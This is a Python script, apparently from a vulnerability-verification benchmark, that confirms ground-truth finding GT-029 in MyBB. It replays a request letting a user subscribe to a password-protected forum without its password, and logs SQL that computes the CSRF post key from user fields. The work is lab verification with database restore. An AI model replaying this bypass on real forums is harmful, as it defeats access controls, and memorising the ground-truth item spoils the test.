"""Manual ground-truth verification for MyBB (GT-029).

usercp2.php?action=addsubscription&fid=2&type=forum — forum 2 ("My Forum")
is password-protected (password 12345678). user1 (uid=2) has never supplied
that password, yet the subscription action has no forum-password check and
creates a forumsubscriptions row.
"""

from __future__ import annotations

import json

import verifier as v

APP = "mybb"
FID = 2


def gt029(det, db) -> dict:
    r = v.Recorder(APP, "GT-029", db)
    forum = db.rows("SELECT fid, name, password FROM mybb_forums WHERE fid=%d" % FID)
    user1 = db.rows("SELECT uid, username FROM mybb_users WHERE username='user1'")
    uid = user1[0][0] if user1 else ""
    subs_before = db.scalar(f"SELECT COUNT(*) FROM mybb_forumsubscriptions WHERE fid={FID} AND uid={uid}")
    r.add("instrument", {"forum": forum, "user1": user1,
                         "subscriptions_before": subs_before})
    db.log_sql(
        "runtime_token_query",
        "SELECT MD5(CONCAT(loginkey,salt,regdate)) FROM mybb_users WHERE username='user1' LIMIT 1"
        "  (my_post_key computed by DRHL runtime-token logic during the replay)",
    )
    user1_role = v.role_for(det, "user1")
    sess = v.role_session(det, "user1")
    try:
        # 1) Prove the forum is password-protected for user1: opening the
        # forum directly asks for the password instead of showing content.
        fdisplay = v.replay(det, sess, f"forumdisplay.php?fid={FID}", {
            "method": "GET", "params": {"fid": str(FID)}, "referer": None,
        }, role=user1_role)
        password_gate = ("Password Required" in fdisplay["body"]) or ("forum_password" in fdisplay["body"])
        fdisplay_file = r.save_body("gt029_user1_forumdisplay", fdisplay["body"])
        r.add("replay", {
            "role": "user1 (has not supplied the forum password)",
            "request": f"GET forumdisplay.php?fid={FID}",
            "status_code": fdisplay["status_code"],
            "forum_password_gate_shown": password_gate,
            "body_saved": fdisplay_file,
        })
        # 2) The subscription action runs without any forum-password check.
        page = f"usercp2.php?action=addsubscription&fid={FID}&type=forum"
        resp = v.replay(det, sess, page, {
            "method": "GET",
            "params": {"action": "addsubscription", "type": "forum", "fid": str(FID), "my_post_key": ""},
            "referer": f"forumdisplay.php?fid={FID}",
        }, role=user1_role)
        subs_after = db.scalar(f"SELECT COUNT(*) FROM mybb_forumsubscriptions WHERE fid={FID} AND uid={uid}")
        created = (subs_after == "1") and subs_before == "0"
        row = db.rows(f"SELECT fid, uid FROM mybb_forumsubscriptions WHERE fid={FID} AND uid={uid}")
        r.add("replay", {
            "role": "user1 (has not supplied the forum password)",
            "request": f"GET {page} (my_post_key computed at runtime)",
            "status_code": resp["status_code"],
            "subscriptions_before": subs_before,
            "subscriptions_after": subs_after,
            "subscription_row_created": row,
            "created": created,
        })
    finally:
        v.close_session(sess)
    verdict = "vulnerable" if created else "not_confirmed"
    summary = (f"forum {FID} is password-protected (forumdisplay shows password gate={password_gate}); "
               f"user1 GET addsubscription returned {resp['status_code']} and created the subscription row "
               f"{row} without ever supplying the forum password (created={created}).")
    return r.finish(verdict, summary)


def main() -> None:
    cfg, snap, det, db = v.app_context(APP)
    baseline = snap.create()
    results = [v.run_record(snap, lambda: gt029(det, db), baseline, cfg.database)]
    (v.app_evidence_dir(APP) / "summary.json").write_text(json.dumps({
        "app": APP,
        "baseline": str(baseline),
        "database_restored_after_each_record": True,
        "restore_verified_per_record": [bool(item.get("restore_verified")) for item in results],
        "final_database_matches_baseline": v.db_matches(cfg.database, baseline),
        "results": results,
    }, ensure_ascii=False, indent=2), encoding="utf-8")
    for item in results:
        print(f"{item['gt_id']}: {item['verdict']} | restored={item.get('restore_verified')} | {item['summary'][:130]}")


if __name__ == "__main__":
    main()
